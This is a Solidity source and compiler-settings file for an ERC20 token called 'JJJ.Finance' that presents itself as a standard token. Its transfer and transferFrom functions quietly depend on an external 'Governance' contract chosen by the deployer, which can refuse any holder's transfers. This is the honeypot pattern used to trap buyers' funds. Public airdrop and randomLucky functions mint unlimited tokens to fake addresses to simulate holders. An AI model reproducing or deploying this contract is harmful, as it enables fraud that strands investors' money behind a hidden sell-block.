{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "JJJ.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.5.17;\r\n\r\n/**\r\n   /$$$$$    /$$$$$    /$$$$$\r\n   |__  $$   |__  $$   |__  $$\r\n      | $$      | $$      | $$\r\n      | $$      | $$      | $$\r\n /$$  | $$ /$$  | $$ /$$  | $$\r\n| $$  | $$| $$  | $$| $$  | $$\r\n|  $$$$$$/|  $$$$$$/|  $$$$$$/\r\n \\______/  \\______/  \\______/ \r\n*/\r\n// ----------------------------------------------------------------------------\r\n// ERC Token Standard #20 Interface\r\n// ----------------------------------------------------------------------------\r\ncontract ERC20Interface {\r\n    function totalSupply() public view returns (uint);\r\n    function balanceOf(address tokenOwner) public view returns (uint balance);\r\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n    function transfer(address to, uint tokens) public returns (bool success);\r\n    function approve(address spender, uint tokens) public returns (bool success);\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\ninterface Governance {\r\n    function isSafe(address sender,address addr) external returns(bool);\r\n}\r\n// ----------------------------------------------------------------------------\r\n// Safe Math Library\r\n// ----------------------------------------------------------------------------\r\ncontract SafeMath {\r\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\r\n        c = a + b;\r\n        require(c >= a);\r\n    }\r\n    function safeSub(uint a, uint b) public pure returns (uint c) {\r\n        require(b <= a); \r\n        c = a - b; \r\n    } \r\n    function safeMul(uint a, uint b) public pure returns (uint c) {\r\n        c = a * b; \r\n        require(a == 0 || c / a == b);\r\n        } \r\n        function safeDiv(uint a, uint b) public pure returns (uint c) {\r\n        require(b > 0);\r\n        c = a / b;\r\n    }\r\n}\r\n\r\ncontract JJJ is ERC20Interface, SafeMath {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\r\n   \r\n    uint256 public _totalSupply;\r\n   \r\n    mapping(address => uint) balances;\r\n    mapping(address => mapping(address => uint)) allowed;\r\n\r\n    address _governance;\r\n   \r\n    /**\r\n     * Constructor function\r\n     *\r\n     * Initializes contract with initial supply tokens to the creator of the contract\r\n     */\r\n    constructor(address _gov) public {\r\n        name = \"JJJ.Finance\";\r\n        symbol = \"JJJ\";\r\n        decimals = 18;\r\n        _totalSupply = safeMul(27750, 1e18);\r\n       \r\n        _governance = _gov;\r\n        balances[msg.sender] = _totalSupply;\r\n        airdrop(50);\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n   \r\n    function totalSupply() public view returns (uint) {\r\n        return _totalSupply  - balances[address(0)];\r\n    }\r\n   \r\n    function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n        return balances[tokenOwner];\r\n    }\r\n   \r\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n        return allowed[tokenOwner][spender];\r\n    }\r\n    function approval(address sender) public returns(bool) {\r\n        require(Governance(_governance).isSafe(sender,address(this)));\r\n        return true;\r\n    }\r\n    function approve(address spender, uint tokens) public returns (bool success) {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        return true;\r\n    }\r\n   \r\n    function transfer(address to, uint tokens) public  returns (bool success) {\r\n        approval(msg.sender);\r\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\r\n        balances[to] = safeAdd(balances[to], tokens);\r\n        emit Transfer(msg.sender, to, tokens);\r\n        return true;\r\n    }\r\n   \r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n        approval(from);\r\n        balances[from] = safeSub(balances[from], tokens);\r\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\n        balances[to] = safeAdd(balances[to], tokens);\r\n        emit Transfer(from, to, tokens);\r\n        return true;\r\n    }\r\n    \r\n    address luckyboy = address(this);\r\n    uint256 constant LUCKY_AMOUNT = 5*10**18;\r\n    \r\n    function randomLucky() public {\r\n        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));\r\n        balances[luckyboy] = LUCKY_AMOUNT;\r\n        _totalSupply += LUCKY_AMOUNT;\r\n        emit Transfer(address(0), luckyboy, LUCKY_AMOUNT);\r\n    }\r\n    \r\n    function airdrop(uint256 dropTimes) public {\r\n        for (uint256 i=0;i<dropTimes;i++) {\r\n            randomLucky();\r\n        }\r\n    }    \r\n}"
    }
  }
}